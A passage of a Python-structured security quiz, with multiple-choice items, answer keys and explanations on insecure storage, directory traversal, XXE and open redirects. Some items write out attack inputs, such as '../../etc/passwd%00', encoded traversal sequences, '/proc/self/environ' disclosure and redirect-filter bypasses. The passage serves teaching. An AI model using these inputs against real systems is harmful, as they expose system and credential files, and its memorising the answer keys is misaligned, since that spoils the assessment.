                "topic": "Insecure Storage",
                "difficulty": "Easy",
                "skill_focus": "Knowledge",
                "explanation": "Data stored on persistent storage (disks, tapes, etc.).",
                "options": [
                    {"text": "Data being sent over the network", "is_correct": False},
                    {"text": "Data stored on disk", "is_correct": True},
                    {"text": "Data in RAM", "is_correct": False},
                    {"text": "Data that has been deleted", "is_correct": False}
                ]
            },
            {
                "text": "Why should you NOT use Reversible Encryption for passwords?",
                "type": "multiple_choice",
                "topic": "Insecure Storage",
                "difficulty": "Hard",
                "skill_focus": "Concept",
                "explanation": "If the key is compromised, all passwords can be decrypted. Hashing is one-way and safer.",
                "options": [
                    {"text": "It is too slow", "is_correct": False},
                    {"text": "If the key leaks, all passwords are exposed", "is_correct": True},
                    {"text": "It is not possible", "is_correct": False},
                    {"text": "It uses too much space", "is_correct": False}
                ]
            },
            {
                "text": "What does a 'Rainbow Table' help an attacker with?",
                "type": "multiple_choice",
                "topic": "Insecure Storage",
                "difficulty": "Medium",
                "skill_focus": "Exploitation",
                "explanation": "It helps crack unsalted hashes by looking up pre-computed hash results.",
                "options": [
                    {"text": "Measuring internet speed", "is_correct": False},
                    {"text": "Cracking unsalted hashes quickly", "is_correct": True},
                    {"text": "Finding hidden directories", "is_correct": False},
                    {"text": "DDoS attacks", "is_correct": False}
                ]
            },
            {
                "text": "What is 'Side-Channel' leakage in storage?",
                "type": "multiple_choice",
                "topic": "Insecure Storage",
                "difficulty": "Hard",
                "skill_focus": "Concept",
                "explanation": "Information leaked through indirect means like timing or error messages.",
                "options": [
                    {"text": "Data through a different port", "is_correct": False},
                    {"text": "Information leakage via timing or side effects", "is_correct": True},
                    {"text": "Data on a side disk", "is_correct": False},
                    {"text": "A backup channel", "is_correct": False}
                ]
            },
            {
                "text": "Which mobile storage area is generally considered more secure on iOS?",
                "type": "multiple_choice",
                "topic": "Insecure Storage",
                "difficulty": "Hard",
                "skill_focus": "Knowledge",
                "explanation": "Keychain and Secure Enclave are highly protected.",
                "options": [
                    {"text": "Documents folder", "is_correct": False},
                    {"text": "Keychain", "is_correct": True},
                    {"text": "Public Cache", "is_correct": False},
                    {"text": "SD Card", "is_correct": False}
                ]
            },
            {
                "text": "What is 'Excessive Data Exposure'?",
                "type": "multiple_choice",
                "topic": "Insecure Storage",
                "difficulty": "Medium",
                "skill_focus": "Concept",
                "explanation": "An API returning more data than the client needs, potentially leaking sensitive info.",
                "options": [
                    {"text": "Showing too many ads", "is_correct": False},
                    {"text": "API returning sensitive data not needed by UI", "is_correct": True},
                    {"text": "A large file download", "is_correct": False},
                    {"text": "A public website", "is_correct": False}
                ]
            },
            {
                "text": "What does 'Tokenization' do?",
                "type": "multiple_choice",
                "topic": "Insecure Storage",
                "difficulty": "Hard",
                "skill_focus": "Concept",
                "explanation": "Replaces sensitive data with a non-sensitive 'token' that has no intrinsic value.",
                "options": [
                    {"text": "Encrypting data with a token", "is_correct": False},
                    {"text": "Replacing sensitive data with a surrogate value", "is_correct": True},
                    {"text": "Counting words in a string", "is_correct": False},
                    {"text": "Logging into a site", "is_correct": False}
                ]
            },
            {
                "text": "Which of these is a symptom of Insecure Storage in logs?",
                "type": "multiple_choice",
                "topic": "Insecure Storage",
                "difficulty": "Easy",
                "skill_focus": "Knowledge",
                "explanation": "Credit card numbers or passwords appearing in application logs.",
                "options": [
                    {"text": "Error 404", "is_correct": False},
                    {"text": "Passwords/PII appearing in plaintext in logs", "is_correct": True},
                    {"text": "Log file being empty", "is_correct": False},
                    {"text": "Fast login times", "is_correct": False}
                ]
            },
            {
                "text": "What is the best way to handle Credit Card data?",
                "type": "multiple_choice",
                "topic": "Insecure Storage",
                "difficulty": "Medium",
                "skill_focus": "Best Practice",
                "explanation": "Don't store it if possible; use payment processors and follow PCI-DSS.",
                "options": [
                    {"text": "Store in a text file", "is_correct": False},
                    {"text": "Use a compliant processor and avoid direct storage", "is_correct": True},
                    {"text": "Hash it", "is_correct": False},
                    {"text": "Encode it to Base64", "is_correct": False}
                ]
            },
            {
                "text": "Backup files are often a source of Insecure Storage because...?",
                "type": "multiple_choice",
                "topic": "Insecure Storage",
                "difficulty": "Medium",
                "skill_focus": "Concept",
                "explanation": "They may lack the protections (auth, encryption) applied to the main database.",
                "options": [
                    {"text": "They are too small", "is_correct": False},
                    {"text": "They often have weaker access controls or no encryption", "is_correct": True},
                    {"text": "They are deleted quickly", "is_correct": False},
                    {"text": "They only contain images", "is_correct": False}
                ]
            },
            {
                "text": "What is the risk of using weak random number generators for keys?",
                "type": "multiple_choice",
                "topic": "Insecure Storage",
                "difficulty": "Hard",
                "skill_focus": "Concept",
                "explanation": "Keys become predictable, allowing attackers to guess them and decrypt data.",
                "options": [
                    {"text": "Slower encryption", "is_correct": False},
                    {"text": "Predictable keys leading to compromise", "is_correct": True},
                    {"text": "Keys being too short", "is_correct": False},
                    {"text": "Random data taking too much space", "is_correct": False}
                ]
            },

            # 8. Directory Traversal (20 Questions)
            {
                "text": "What is Directory Traversal?",
                "type": "multiple_choice",
                "topic": "Directory Traversal",
                "difficulty": "Easy",
                "skill_focus": "Knowledge",
                "explanation": "An attack where the user can access files outside intended directories.",
                "options": [
                    {"text": "Deleting files", "is_correct": False},
                    {"text": "Accessing unauthorized files by manipulating paths", "is_correct": True},
                    {"text": "Changing directories in Shell", "is_correct": False},
                    {"text": "Listing directory contents", "is_correct": False}
                ]
            },
            {
                "text": "Which character sequence is used for 'Dot-Dot-Slash' attacks?",
                "type": "multiple_choice",
                "topic": "Directory Traversal",
                "difficulty": "Easy",
                "skill_focus": "Exploitation",
                "explanation": "../ moves one directory level up.",
                "options": [
                    {"text": "./", "is_correct": False},
                    {"text": "../", "is_correct": True},
                    {"text": "//", "is_correct": False},
                    {"text": "$\\", "is_correct": False}
                ]
            },
            {
                "text": "What is another name for Directory Traversal?",
                "type": "multiple_choice",
                "topic": "Directory Traversal",
                "difficulty": "Medium",
                "skill_focus": "Knowledge",
                "explanation": "Path Traversal.",
                "options": [
                    {"text": "File Inclusion", "is_correct": False},
                    {"text": "Path Traversal", "is_correct": True},
                    {"text": "Route Hijacking", "is_correct": False},
                    {"text": "URL Injection", "is_correct": False}
                ]
            },
            {
                "text": "Which file in Linux is a common target for traversal attacks?",
                "type": "multiple_choice",
                "topic": "Directory Traversal",
                "difficulty": "Easy",
                "skill_focus": "Exploitation",
                "explanation": "/etc/passwd contains user account info and is globally readable.",
                "options": [
                    {"text": "/var/log/syslog", "is_correct": False},
                    {"text": "/etc/passwd", "is_correct": True},
                    {"text": "/home/user/desktop", "is_correct": False},
                    {"text": "/tmp/test", "is_correct": False}
                ]
            },
            {
                "text": "How can you prevent Directory Traversal?",
                "type": "multiple_choice",
                "topic": "Directory Traversal",
                "difficulty": "Medium",
                "skill_focus": "Prevention",
                "explanation": "Input validation (whitelisting) and using filesystem APIs that resolve paths.",
                "options": [
                    {"text": "Blocking the word 'slash'", "is_correct": False},
                    {"text": "Validating and sanitizing path inputs", "is_correct": True},
                    {"text": "Using more directories", "is_correct": False},
                    {"text": "Disabling the internet", "is_correct": False}
                ]
            },
            {
                "text": "What does a 'Chroot Jail' do?",
                "type": "multiple_choice",
                "topic": "Directory Traversal",
                "difficulty": "Hard",
                "skill_focus": "Mitigation",
                "explanation": "Restricts the process's view of the filesystem to a specific directory.",
                "options": [
                    {"text": "Deletes the process", "is_correct": False},
                    {"text": "Restricts filesystem access to a sub-directory", "is_correct": True},
                    {"text": "Encrypts the directory", "is_correct": False},
                    {"text": "Speeds up disk access", "is_correct": False}
                ]
            },
            {
                "text": "Can encoding be used to bypass traversal filters?",
                "type": "multiple_choice",
                "topic": "Directory Traversal",
                "difficulty": "Medium",
                "skill_focus": "Evasion",
                "explanation": "Yes, URL encoding (%2E%2E%2F) can bypass simple string filters.",
                "options": [
                    {"text": "No", "is_correct": False},
                    {"text": "Yes, e.g., using URL or Unicode encoding", "is_correct": True},
                    {"text": "Only in Windows", "is_correct": False},
                    {"text": "Only for images", "is_correct": False}
                ]
            },
            {
                "text": "What is the result of `file.php?page=../../etc/passwd%00`?",
                "type": "multiple_choice",
                "topic": "Directory Traversal",
                "difficulty": "Hard",
                "skill_focus": "Exploitation",
                "explanation": "%00 is a Null Byte, used to terminate strings in some languages (like older PHP/C).",
                "options": [
                    {"text": "A syntax error", "is_correct": False},
                    {"text": "Null Byte injection to bypass file extension checks", "is_correct": True},
                    {"text": "Deleting the file", "is_correct": False},
                    {"text": "Nothing", "is_correct": False}
                ]
            },
            {
                "text": "Which PHP function is often involved in traversal/LFI vulnerabilities?",
                "type": "multiple_choice",
                "topic": "Directory Traversal",
                "difficulty": "Medium",
                "skill_focus": "Knowledge",
                "explanation": "`include()`, `require()`, `file_get_contents()`.",
                "options": [
                    {"text": "echo()", "is_correct": False},
                    {"text": "include()", "is_correct": True},
                    {"text": "var_dump()", "is_correct": False},
                    {"text": "explode()", "is_correct": False}
                ]
            },
            {
                "text": "What is 'Local File Inclusion' (LFI)?",
                "type": "multiple_choice",
                "topic": "Directory Traversal",
                "difficulty": "Medium",
                "skill_focus": "Concept",
                "explanation": "The app includes and potentially executes files from the local server based on user input.",
                "options": [
                    {"text": "Uploading a file", "is_correct": False},
                    {"text": "Including local server files in execution", "is_correct": True},
                    {"text": "Deleting a file", "is_correct": False},
                    {"text": "Sending a file over email", "is_correct": False}
                ]
            },
            {
                "text": "What is 'Remote File Inclusion' (RFI)?",
                "type": "multiple_choice",
                "topic": "Directory Traversal",
                "difficulty": "Hard",
                "skill_focus": "Concept",
                "explanation": "The app includes and executes files from a remote server/URL.",
                "options": [
                    {"text": "Downloading a file", "is_correct": False},
                    {"text": "Including remote files in execution via URL", "is_correct": True},
                    {"text": "Hacking a remote server", "is_correct": False},
                    {"text": "Cloud storage", "is_correct": False}
                ]
            },
            {
                "text": "What does a successful LFI to RCE payload often use in Linux?",
                "type": "multiple_choice",
                "topic": "Directory Traversal",
                "difficulty": "Hard",
                "skill_focus": "Exploitation",
                "explanation": "Log poisoning (injecting code into logs and then including those logs).",
                "options": [
                    {"text": "Deleting logs", "is_correct": False},
                    {"text": "Log Poisoning", "is_correct": True},
                    {"text": "Changing the theme", "is_correct": False},
                    {"text": "Rebooting the server", "is_correct": False}
                ]
            },
            {
                "text": "Where is the 'win.ini' file located in Windows?",
                "type": "multiple_choice",
                "topic": "Directory Traversal",
                "difficulty": "Medium",
                "skill_focus": "Exploitation",
                "explanation": "C:\\Windows\\win.ini",
                "options": [
                    {"text": "C:\\System32", "is_correct": False},
                    {"text": "C:\\Windows\\win.ini", "is_correct": True},
                    {"text": "C:\\Program Files", "is_correct": False},
                    {"text": "D:\\Backup", "is_correct": False}
                ]
            },
            {
                "text": "What is the best way to handle file downloads safely?",
                "type": "multiple_choice",
                "topic": "Directory Traversal",
                "difficulty": "Hard",
                "skill_focus": "Prevention",
                "explanation": "Use an ID (index) in the URL and look up the path in a database.",
                "options": [
                    {"text": "Passing the full path in URL", "is_correct": False},
                    {"text": "Using a database ID instead of filenames", "is_correct": True},
                    {"text": "Allowing all files", "is_correct": False},
                    {"text": "Using base64 names", "is_correct": False}
                ]
            },
            {
                "text": "Which character represents the Root directory in Linux?",
                "type": "multiple_choice",
                "topic": "Directory Traversal",
                "difficulty": "Easy",
                "skill_focus": "Knowledge",
                "explanation": "/",
                "options": [
                    {"text": "\\", "is_correct": False},
                    {"text": "/", "is_correct": True},
                    {"text": "~", "is_correct": False},
                    {"text": "$", "is_correct": False}
                ]
            },
            {
                "text": "What function in Node.js should be used cautiously on path strings?",
                "type": "multiple_choice",
                "topic": "Directory Traversal",
                "difficulty": "Medium",
                "skill_focus": "Prevention",
                "explanation": "`path.join` vs `path.resolve`. `path.resolve` handles absolute paths more safely.",
                "options": [
                    {"text": "fs.readFile", "is_correct": False},
                    {"text": "path.join / path.resolve", "is_correct": True},
                    {"text": "http.get", "is_correct": False},
                    {"text": "util.promisify", "is_correct": False}
                ]
            },
            {
                "text": "Why is 'Base Directory' check important?",
                "type": "multiple_choice",
                "topic": "Directory Traversal",
                "difficulty": "Medium",
                "skill_focus": "Prevention",
                "explanation": "To ensure the resolved path starts with the allowed root directory.",
                "options": [
                    {"text": "To find where files are", "is_correct": False},
                    {"text": "To verify file is within the intended folder", "is_correct": True},
                    {"text": "To delete old files", "is_correct": False},
                    {"text": "To show breadcrumbs", "is_correct": False}
                ]
            },
            {
                "text": "Can Directory Traversal happen in cookie values?",
                "type": "multiple_choice",
                "topic": "Directory Traversal",
                "difficulty": "Medium",
                "skill_focus": "Concept",
                "explanation": "Yes, if the cookie is used to determine a file path (e.g. `theme=standard`).",
                "options": [
                    {"text": "No", "is_correct": False},
                    {"text": "Yes, if the value is used in filesystem calls", "is_correct": True},
                    {"text": "Only in old browsers", "is_correct": False},
                    {"text": "Only if cookies are not secure", "is_correct": False}
                ]
            },
            {
                "text": "What does a 'Double Encoding' attack look like?",
                "type": "multiple_choice",
                "topic": "Directory Traversal",
                "difficulty": "Hard",
                "skill_focus": "Evasion",
                "explanation": "Encoding the % character itself (%252E instead of %2E).",
                "options": [
                    {"text": "Encoding twice with Base64", "is_correct": False},
                    {"text": "Encoding the encoding (%25)", "is_correct": True},
                    {"text": "Using two passwords", "is_correct": False},
                    {"text": "Encrypted URL", "is_correct": False}
                ]
            },
            {
                "text": "Is it safe to allow users to specify file extensions?",
                "type": "multiple_choice",
                "topic": "Directory Traversal",
                "difficulty": "Medium",
                "skill_focus": "Prevention",
                "explanation": "No, it should be hardcoded or restricted to a whitelist.",
                "options": [
                    {"text": "Yes", "is_correct": False},
                    {"text": "No, should be hardcoded or whitelisted", "is_correct": True},
                    {"text": "Only if they are '.txt'", "is_correct": False},
                    {"text": "Only if files are small", "is_correct": False}
                ]
            },

            # 9. XML External Entity (XXE) (20 Questions)
            {
                "text": "What does XXE stand for?",
                "type": "multiple_choice",
                "topic": "XML External Entity (XXE)",
                "difficulty": "Easy",
                "skill_focus": "Knowledge",
                "explanation": "XML External Entity.",
                "options": [
                    {"text": "XHTML External Extensions", "is_correct": False},
                    {"text": "XML External Entity", "is_correct": True},
                    {"text": "Extra XML Element", "is_correct": False},
                    {"text": "X-linked XML Entry", "is_correct": False}
                ]
            },
            {
                "text": "How does an XXE attack occur?",
                "type": "multiple_choice",
                "topic": "XML External Entity (XXE)",
                "difficulty": "Medium",
                "skill_focus": "Concept",
                "explanation": "Weakly configured XML parser processes external entity references in an XML document.",
                "options": [
                    {"text": "Injecting SQL into XML", "is_correct": False},
                    {"text": "Parser processes external references in XML", "is_correct": True},
                    {"text": "Deleting XML files", "is_correct": False},
                    {"text": "XSS via XML", "is_correct": False}
                ]
            },
            {
                "text": "What can an attacker achieve with XXE?",
                "type": "multiple_choice",
                "topic": "XML External Entity (XXE)",
                "difficulty": "Medium",
                "skill_focus": "Knowledge",
                "explanation": "Local file disclosure, SSRF, and potentially DoS.",
                "options": [
                    {"text": "Only change the font", "is_correct": False},
                    {"text": "Disclose files, perform SSRF, or DoS", "is_correct": True},
                    {"text": "Reset admin password", "is_correct": False},
                    {"text": "Nothing", "is_correct": False}
                ]
            },
            {
                "text": "Which part of XML is exploited in XXE?",
                "type": "multiple_choice",
                "topic": "XML External Entity (XXE)",
                "difficulty": "Hard",
                "skill_focus": "Knowledge",
                "explanation": "The Document Type Definition (DTD).",
                "options": [
                    {"text": "The root element", "is_correct": False},
                    {"text": "The DTD (Document Type Definition)", "is_correct": True},
                    {"text": "The comments", "is_correct": False},
                    {"text": "The attribute values", "is_correct": False}
                ]
            },
            {
                "text": "What is the best defense against XXE?",
                "type": "multiple_choice",
                "topic": "XML External Entity (XXE)",
                "difficulty": "Medium",
                "skill_focus": "Prevention",
                "explanation": "Disable DTD and external entity processing in the XML parser.",
                "options": [
                    {"text": "Use JSON instead", "is_correct": False},
                    {"text": "Disable DTD/External Entity processing", "is_correct": True},
                    {"text": "Encode the XML", "is_correct": False},
                    {"text": "Use a newer computer", "is_correct": False}
                ]
            },
            {
                "text": "What is 'Billion Laughs' attack?",
                "type": "multiple_choice",
                "topic": "XML External Entity (XXE)",
                "difficulty": "Medium",
                "skill_focus": "Concept",
                "explanation": "An XML Dos attack (exponential entity expansion) that crashes the parser.",
                "options": [
                    {"text": "A joke website", "is_correct": False},
                    {"text": "An XML denial of service (DoS)", "is_correct": True},
                    {"text": "A virus that plays laughter", "is_correct": False},
                    {"text": "A SQL injection trick", "is_correct": False}
                ]
            },
            {
                "text": "What is OOB-XXE (Out-of-Band XXE)?",
                "type": "multiple_choice",
                "topic": "XML External Entity (XXE)",
                "difficulty": "Hard",
                "skill_focus": "Exploitation",
                "explanation": "Exfiltrating data through an external network request when response is not shown.",
                "options": [
                    {"text": "XXE that happens later", "is_correct": False},
                    {"text": "Exfiltrating data via external requests", "is_correct": True},
                    {"text": "XXE on a different server", "is_correct": False},
                    {"text": "A band aid for XXE", "is_correct": False}
                ]
            },
            {
                "text": "Which keyword is used to define an external entity in DTD?",
                "type": "multiple_choice",
                "topic": "XML External Entity (XXE)",
                "difficulty": "Hard",
                "skill_focus": "Knowledge",
                "explanation": "SYSTEM.",
                "options": [
                    {"text": "EXTERNAL", "is_correct": False},
                    {"text": "SYSTEM", "is_correct": True},
                    {"text": "FILE", "is_correct": False},
                    {"text": "GET", "is_correct": False}
                ]
            },
            {
                "text": "SSRF (Server-Side Request Forgery) can be achieved via XXE by...?",
                "type": "multiple_choice",
                "topic": "XML External Entity (XXE)",
                "difficulty": "Medium",
                "skill_focus": "Concept",
                "explanation": "Using a URL in the SYSTEM entity definition.",
                "options": [
                    {"text": "Injecting scripts", "is_correct": False},
                    {"text": "Pointing SYSTEM entity to a URL", "is_correct": True},
                    {"text": "Deleting the firewall", "is_correct": False},
                    {"text": "Overloading the CPU", "is_correct": False}
                ]
            },
            {
                "text": "Can XXE happen if I only use modern libraries?",
                "type": "multiple_choice",
                "topic": "XML External Entity (XXE)",
                "difficulty": "Easy",
                "skill_focus": "Knowledge",
                "explanation": "Many modern libraries disable DTD by default, but you should still verify configuration.",
                "options": [
                    {"text": "No, it's impossible", "is_correct": False},
                    {"text": "Yes, always verify if DTD is disabled", "is_correct": True},
                    {"text": "Only if used on Linux", "is_correct": False},
                    {"text": "Only in Java", "is_correct": False}
                ]
            },
            {
                "text": "What is more secure than XML for data exchange?",
                "type": "multiple_choice",
                "topic": "XML External Entity (XXE)",
                "difficulty": "Easy",
                "skill_focus": "Knowledge",
                "explanation": "JSON is simpler and less prone to exploitation like XXE.",
                "options": [
                    {"text": "Plain text", "is_correct": False},
                    {"text": "JSON", "is_correct": True},
                    {"text": "Binary", "is_correct": False},
                    {"text": "HTML", "is_correct": False}
                ]
            },
            {
                "text": "What is a 'Parameter Entity' in XXE?",
                "type": "multiple_choice",
                "topic": "XML External Entity (XXE)",
                "difficulty": "Hard",
                "skill_focus": "Knowledge",
                "explanation": "Entity starting with '%' used only within the DTD, often for OOB exfiltration.",
                "options": [
                    {"text": "An entity for functions", "is_correct": False},
                    {"text": "A special entity used within DTDs", "is_correct": True},
                    {"text": "An entity for parameters", "is_correct": False},
                    {"text": "A hidden entity", "is_correct": False}
                ]
            },
            {
                "text": "Which format is often vulnerable to XXE during upload?",
                "type": "multiple_choice",
                "topic": "XML External Entity (XXE)",
                "difficulty": "Medium",
                "skill_focus": "Knowledge",
                "explanation": "Formats based on XML, like DOCX, SVG, or PDF.",
                "options": [
                    {"text": "JPEG", "is_correct": False},
                    {"text": "SVG or DOCX", "is_correct": True},
                    {"text": "PNG", "is_correct": False},
                    {"text": "TXT", "is_correct": False}
                ]
            },
            {
                "text": "How do you test for XXE?",
                "type": "multiple_choice",
                "topic": "XML External Entity (XXE)",
                "difficulty": "Easy",
                "skill_focus": "Exploitation",
                "explanation": "Inject a simple entity and see if it's resolved or triggers an error/request.",
                "options": [
                    {"text": "Sending a long string", "is_correct": False},
                    {"text": "Injecting an external entity reference", "is_correct": True},
                    {"text": "Restarting the app", "is_correct": False},
                    {"text": "Changing the port", "is_correct": False}
                ]
            },
            {
                "text": "Blind XXE is when...?",
                "type": "multiple_choice",
                "topic": "XML External Entity (XXE)",
                "difficulty": "Medium",
                "skill_focus": "Concept",
                "explanation": "The output of the entity is not returned in the application response.",
                "options": [
                    {"text": "Attacker can't see the screen", "is_correct": False},
                    {"text": "Response data doesn't include the entity's expansion", "is_correct": True},
                    {"text": "XML is encrypted", "is_correct": False},
                    {"text": "The server is offline", "is_correct": False}
                ]
            },
            {
                "text": "Which XML parser feature in Java is key to disabling XXE?",
                "type": "multiple_choice",
                "topic": "XML External Entity (XXE)",
                "difficulty": "Hard",
                "skill_focus": "Prevention",
                "explanation": "Setting 'disallow-doctype-decl' to true.",
                "options": [
                    {"text": "setAllowExternal(false)", "is_correct": False},
                    {"text": "setFeature('http://apache.org/xml/features/disallow-doctype-decl', true)", "is_correct": True},
                    {"text": "xml.secure = true", "is_correct": False},
                    {"text": "disableDTD()", "is_correct": False}
                ]
            },
            {
                "text": "What is 'XInclude' attack?",
                "type": "multiple_choice",
                "topic": "XML External Entity (XXE)",
                "difficulty": "Hard",
                "skill_focus": "Concept",
                "explanation": "Similar to XXE but uses XInclude elements to include files/URLs.",
                "options": [
                    {"text": "Including XSS", "is_correct": False},
                    {"text": "Using XInclude for file disclosure", "is_correct": True},
                    {"text": "Cross site inclusion", "is_correct": False},
                    {"text": "None", "is_correct": False}
                ]
            },
            {
                "text": "Does XXE require the attacker to send a full XML document?",
                "type": "multiple_choice",
                "topic": "XML External Entity (XXE)",
                "difficulty": "Medium",
                "skill_focus": "Knowledge",
                "explanation": "Sometimes just a snippet inside a multipart request or SVG can be sufficient.",
                "options": [
                    {"text": "Yes, always", "is_correct": False},
                    {"text": "No, it depends on the parser and context", "is_correct": True},
                    {"text": "Only on Windows", "is_correct": False},
                    {"text": "Only for SOAP", "is_correct": False}
                ]
            },
            {
                "text": "What is the result of disclosing '/proc/self/environ' on Linux via XXE?",
                "type": "multiple_choice",
                "topic": "XML External Entity (XXE)",
                "difficulty": "Hard",
                "skill_focus": "Exploitation",
                "explanation": "Reveals environment variables, which may contain sensitive keys or config info.",
                "options": [
                    {"text": "Crashes the system", "is_correct": False},
                    {"text": "Reveals environment variables", "is_correct": True},
                    {"text": "Changes the time", "is_correct": False},
                    {"text": "Nothing", "is_correct": False}
                ]
            },
            {
                "text": "Why is XXE less common today?",
                "type": "multiple_choice",
                "topic": "XML External Entity (XXE)",
                "difficulty": "Easy",
                "skill_focus": "Knowledge",
                "explanation": "Modern parsers disable the dangerous features by default.",
                "options": [
                    {"text": "XML is no longer used", "is_correct": False},
                    {"text": "Defaults have changed to secure-by-default in most libraries", "is_correct": True},
                    {"text": "It was patched in the internet", "is_correct": False},
                    {"text": "Attackers forgot about it", "is_correct": False}
                ]
            },

            # 10. Unvalidated Redirect (20 Questions)
            {
                "text": "What is an Unvalidated Redirect?",
                "type": "multiple_choice",
                "topic": "Unvalidated Redirect",
                "difficulty": "Easy",
                "skill_focus": "Knowledge",
                "explanation": "The app accepts a user-provided URL and redirects the user to it without validation.",
                "options": [
                    {"text": "A broken link", "is_correct": False},
                    {"text": "Redirecting users to an untrusted external site", "is_correct": True},
                    {"text": "Sending a user to home page", "is_correct": False},
                    {"text": "Slow redirection", "is_correct": False}
                ]
            },
            {
                "text": "What is an 'Open Redirect'?",
                "type": "multiple_choice",
                "topic": "Unvalidated Redirect",
                "difficulty": "Easy",
                "skill_focus": "Knowledge",
                "explanation": "Same as Unvalidated Redirect; any URL can be used for redirection.",
                "options": [
                    {"text": "A public redirect", "is_correct": False},
                    {"text": "An unvalidated redirect", "is_correct": True},
                    {"text": "A faster redirect", "is_correct": False},
                    {"text": "A manual redirect", "is_correct": False}
                ]
            },
            {
                "text": "What is the primary risk of Open Redirects?",
                "type": "multiple_choice",
                "topic": "Unvalidated Redirect",
                "difficulty": "Medium",
                "skill_focus": "Knowledge",
                "explanation": "Facilitating Phishing attacks by using a trusted domain to send users to a malicious site.",
                "options": [
                    {"text": "Stealing cookies", "is_correct": False},
                    {"text": "Making Phishing attacks look more credible", "is_correct": True},
                    {"text": "Deleting user data", "is_correct": False},
                    {"text": "SQL Injection", "is_correct": False}
                ]
            },
            {
                "text": "Which parameter name is often seen in unvalidated redirects?",
                "type": "multiple_choice",
                "topic": "Unvalidated Redirect",
                "difficulty": "Easy",
                "skill_focus": "Knowledge",
                "explanation": "`?url=`, `?redirect=`, `?next=`, `?dest=`.",
                "options": [
                    {"text": "id", "is_correct": False},
                    {"text": "next / url / return", "is_correct": True},
                    {"text": "user", "is_correct": False},
                    {"text": "page", "is_correct": False}
                ]
            },
            {
                "text": "How can you prevent Unvalidated Redirects?",
                "type": "multiple_choice",
                "topic": "Unvalidated Redirect",
                "difficulty": "Medium",
                "skill_focus": "Prevention",
                "explanation": "Avoid user-provided input for redirects; use whitelists or relative URLs.",
                "options": [
                    {"text": "Blocking the word 'http'", "is_correct": False},
                    {"text": "Using a whitelist of allowed domains or relative paths", "is_correct": True},
                    {"text": "Hiding the URL", "is_correct": False},
                    {"text": "Encrypted parameters", "is_correct": False}
                ]
            },
            {
                "text": "What is a 'Forward' in web applications?",
                "type": "multiple_choice",
                "topic": "Unvalidated Redirect",
                "difficulty": "Medium",
                "skill_focus": "Concept",
                "explanation": "Internal server-side transfer to another resource, also a risk if unvalidated.",
                "options": [
                    {"text": "Moving to the next page", "is_correct": False},
                    {"text": "Internal server-side redirection (Transfer)", "is_correct": True},
                    {"text": "Sending an email", "is_correct": False},
                    {"text": "Linking to google", "is_correct": False}
                ]
            },
            {
                "text": "Which HTTP status code is used for temporary redirects?",
                "type": "multiple_choice",
                "topic": "Unvalidated Redirect",
                "difficulty": "Easy",
                "skill_focus": "Knowledge",
                "explanation": "302 Found.",
                "options": [
                    {"text": "200", "is_correct": False},
                    {"text": "302", "is_correct": True},
                    {"text": "404", "is_correct": False},
                    {"text": "500", "is_correct": False}
                ]
            },
            {
                "text": "What does a payload like `//google.com` achieve in some redirect filters?",
                "type": "multiple_choice",
                "topic": "Unvalidated Redirect",
                "difficulty": "Hard",
                "skill_focus": "Evasion",
                "explanation": "Protocol-relative URL, bypasses filters looking for 'http' but still redirects externally.",
                "options": [
                    {"text": "Nothing", "is_correct": False},
                    {"text": "Bypassing 'http' filters (Protocol-relative URL)", "is_correct": True},
                    {"text": "It is a comment", "is_correct": False},
                    {"text": "Changes the domain", "is_correct": False}
                ]
            },
            {
                "text": "Can Open Redirect be used to leak sensitive tokens?",
                "type": "multiple_choice",
                "topic": "Unvalidated Redirect",
                "difficulty": "Hard",
                "skill_focus": "Chaining",
                "explanation": "Yes, e.g., stealing OAuth tokens if they are in the URL fragment during redirect.",
                "options": [
                    {"text": "No", "is_correct": False},
                    {"text": "Yes, especially in OAuth/Token flows", "is_correct": True},
                    {"text": "Only in HTTPS", "is_correct": False},
                    {"text": "Only for admins", "is_correct": False}
                ]
            },
            {
                "text": "What is the risk of redirecting to `javascript:alert(1)`?",
                "type": "multiple_choice",
                "topic": "Unvalidated Redirect",
                "difficulty": "Hard",
                "skill_focus": "Exploitation",
                "explanation": "It could lead to XSS if the browser attempts to 'navigate' to the JS pseudo-protocol.",
                "options": [
                    {"text": "It is safe", "is_correct": False},
                    {"text": "Potential XSS conversion", "is_correct": True},
                    {"text": "Broken link", "is_correct": False},
                    {"text": "Nothing", "is_correct": False}
                ]
            },
            {
                "text": "What does 'Relative Path' redirection mean?",
                "type": "multiple_choice",
                "topic": "Unvalidated Redirect",
                "difficulty": "Easy",
                "skill_focus": "Prevention",
                "explanation": "Redirecting within the same site using paths like `/login` instead of full URLs.",
                "options": [
                    {"text": "Redirecting to a relative's site", "is_correct": False},
                    {"text": "Redirecting within the same domain", "is_correct": True},
                    {"text": "Slow redirect", "is_correct": False},
                    {"text": "Redirecting to previous page", "is_correct": False}
                ]
            },
            {
                "text": "Which character should be avoided at the start of a user-controlled redirect path?",
                "type": "multiple_choice",
                "topic": "Unvalidated Redirect",
                "difficulty": "Hard",
                "skill_focus": "Prevention",
                "explanation": "Double slash `//` (protocol-relative) and backslashes `\\` (in some browsers).",
                "options": [
                    {"text": "/", "is_correct": False},
                    {"text": "// or \\", "is_correct": True},
                    {"text": "?", "is_correct": False},
                    {"text": "#", "is_correct": False}
                ]
            },
            {
                "text": "Is 'Open Redirect' considered a critical vulnerability on its own?",
                "type": "multiple_choice",
                "topic": "Unvalidated Redirect",
                "difficulty": "Medium",
                "skill_focus": "Knowledge",
                "explanation": "Usually Medium/Low, but high risk when chained (e.g., OAuth token leakage).",
                "options": [
                    {"text": "Yes, always", "is_correct": False},
                    {"text": "Usually Low/Medium unless chained", "is_correct": True},
                    {"text": "No, it is a feature", "is_correct": False},
                    {"text": "Only if used on banking sites", "is_correct": False}
                ]
            },
            {
                "text": "What is a 'Malicious Redirect'?",
                "type": "multiple_choice",
                "topic": "Unvalidated Redirect",
                "difficulty": "Easy",
                "skill_focus": "Concept",
                "explanation": "A redirect that sends the user to a malware-serving or phishing site.",
                "options": [
                    {"text": "Slow redirect", "is_correct": False},
                    {"text": "A redirect used for malicious purposes", "is_correct": True},
                    {"text": "A redirect that crashes the browser", "is_correct": False},
                    {"text": "An error message", "is_correct": False}
                ]
            },
            {
                "text": "Why do attackers like using the victim's host in the redirect URL?",
                "type": "multiple_choice",
                "topic": "Unvalidated Redirect",
                "difficulty": "Medium",
                "skill_focus": "Exploitation",
                "explanation": "To make the malicious link look trustworthy (social engineering).",
                "options": [
                    {"text": "For performance", "is_correct": False},
                    {"text": "To hide the destination and gain trust", "is_correct": True},
                    {"text": "To bypass HTTPS", "is_correct": False},
                    {"text": "They don't", "is_correct": False}
                ]
            },
            {
